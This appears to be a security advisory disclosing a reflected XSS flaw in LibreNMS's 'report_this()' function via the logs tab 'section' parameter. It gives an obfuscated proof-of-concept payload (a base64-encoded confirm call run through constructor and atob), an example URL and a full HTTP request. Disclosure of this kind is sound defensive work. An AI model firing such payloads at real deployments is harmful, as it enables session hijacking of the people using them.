  "summary": "LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/functions.php",
  "details": "### Summary\nA Reflected Cross-Site Scripting (XSS) vulnerability in the \"section\" parameter of the \"logs\" tab of a device allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious \"section\" parameter, potentially compromising their session and enabling unauthorized actions. The issue arises from a lack of sanitization in the \"report_this()\" function.\n\n### Details\nThe \"section\" parameter of the \"logs\" tab is vulnerable to reflected XSS. An attacker can inject the following XSS payload into the \"section\" parameter:\n```<script>constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();<%2fscript>```\n\nWhen the page is loaded with this malicious parameter, the script executes immediately. This vulnerability occurs due to the lack of sanitization in the \"report_this()\" function. Other endpoints using this same function may also be vulnerable.\n\nThe vulnerable sink is located here:\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/functions.php#L523\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/logs.inc.php#L93\n\n### PoC\n1. Inject the following payload into the \"section\" parameter of the \"logs\" tab:\n```<script>constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();<%2fscript>```\n2. Access the page with the injected payload.\n3. Observe that the injected script executes when the page is loaded.\n\nExample URL: ```http://<your_url>/device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/```\n\nExample Request:\n```http\nGET /device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/ HTTP/1.1\nHost: <your_host>\nCookie: <your_cookie>\n```\n\n### Impact\n\nThis vulnerability allows attackers to execute arbitrary JavaScript in the context of a userâ€™s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.\n",
